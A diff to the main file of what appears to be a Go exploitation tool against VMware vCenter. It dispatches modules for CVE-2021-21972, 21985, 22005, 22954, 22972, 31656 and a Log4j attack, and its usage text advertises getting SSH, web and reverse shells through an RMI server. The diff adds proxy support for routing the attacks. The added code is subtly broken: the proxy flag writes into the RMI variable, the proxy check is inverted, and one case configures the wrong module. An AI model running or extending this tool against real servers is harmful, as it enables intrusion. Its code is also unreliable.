@@ -10,9 +10,11 @@ import (
 	"flag"
 	"fmt"
 	"io/ioutil"
+	url_parse "net/url"
 	"os"
 )
-//1
+
+// 1
 var (
 	h        bool
 	url      string
@@ -37,7 +39,8 @@ func usage() {
 	-t attack mode
 		  your attack mode, example: use "ssh" to get ssh shell, not webshell, use -r rmi://xx/xx to get reverseshell
 	-r rmi server
-		  your ldap & rmi server`)
+		  your ldap & rmi server
+	-proxy ProxyServer`)
 }
 
 func banner() {
@@ -58,6 +61,7 @@ func main() {
 	flag.StringVar(&command, "c", "", "command")
 	flag.StringVar(&exp_type, "t", "", "CVE-2021-21972 Module")
 	flag.StringVar(&rmi, "r", "", "rmi server address")
+	flag.StringVar(&rmi, "proxy", "", "proxy server, support http and socks5")
 	flag.Usage = usage
 	flag.Parse()
 	banner()
@@ -73,10 +77,21 @@ func main() {
 	switch cve {
 	case "22205":
 		{
+			if checkProxyServer(proxy) == true {
+				c_22005.Proxy_server = proxy
+			} else {
+				c_22005.Proxy_server = ""
+			}
+
 			c_22005.Test(url, filename)
 		}
 	case "21985":
 		{
+			if checkProxyServer(proxy) == true {
+				c_21985.Proxy_server = proxy
+			} else {
+				c_21985.Proxy_server = ""
+			}
 			if exp_type == "rshell" {
 				c_21985.Exploit(url, rmi)
 			} else if exp_type == "" {
@@ -88,6 +103,11 @@ func main() {
 		}
 	case "21972":
 		{
+			if checkProxyServer(proxy) == true {
+				c_21972.Proxy_server = proxy
+			} else {
+				c_21972.Proxy_server = ""
+			}
 			t, err := ioutil.ReadFile(filename)
 			_ = err
 			fmt.Println(string(t))
@@ -102,6 +122,11 @@ func main() {
 		}
 	case "log4center":
 		{
+			if checkProxyServer(proxy) == true {
+				log4jcenter.Proxy_server = proxy
+			} else {
+				log4jcenter.Proxy_server = ""
+			}
 			if exp_type == "scan" {
 
 				log4jcenter.StartScan(url)
@@ -130,6 +155,11 @@ func main() {
 		}
 	case "22954":
 		{
+			if checkProxyServer(proxy) == true {
+				c22954.Proxy_server = proxy
+			} else {
+				c22954.Proxy_server = ""
+			}
 			if command != "" {
 				c22954.Start(url, command)
 			} else {
@@ -138,12 +168,31 @@ func main() {
 		}
 	case "22972":
 		{
+			if checkProxyServer(proxy) == true {
+				c22972.Proxy_server = proxy
+			} else {
+				c22972.Proxy_server = ""
+			}
 			c22972.Start(url, "", "22972")
 		}
 	case "31656":
 		{
+			if checkProxyServer(proxy) == true {
+				c22972.Proxy_server = proxy
+			} else {
+				c22972.Proxy_server = ""
+			}
 			c22972.Start(url, "", "31656")
 		}
 	}
 
+}
+
+func checkProxyServer(Proxy_url string) bool {
+	_, err := url_parse.Parse(Proxy_url)
+	if err != nil {
+		return true
+	} else {
+		return false
+	}
 }
